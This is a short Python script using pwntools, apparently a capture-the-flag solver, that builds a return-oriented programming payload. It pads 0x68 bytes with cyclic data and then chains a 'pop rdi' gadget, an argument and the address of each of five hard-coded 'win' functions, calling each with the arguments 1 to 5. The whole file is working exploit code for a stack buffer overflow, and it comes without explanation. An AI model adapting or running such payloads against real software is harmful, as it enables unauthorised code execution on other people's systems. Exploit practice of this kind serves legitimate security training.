from pwn import * 

RDI=0x401e03

wins = [0x00401aea, 0x00401bc6, 0x0040183f, 0x00401a04, 0x00401921]

def get_payload(args, proc: process):
    payload = cyclic(0x68)
    count = 1
    
    for i,addr in enumerate(wins):
        payload += p64(RDI)
        payload += p64(i+1)
        payload += p64(addr)

    return payload

    
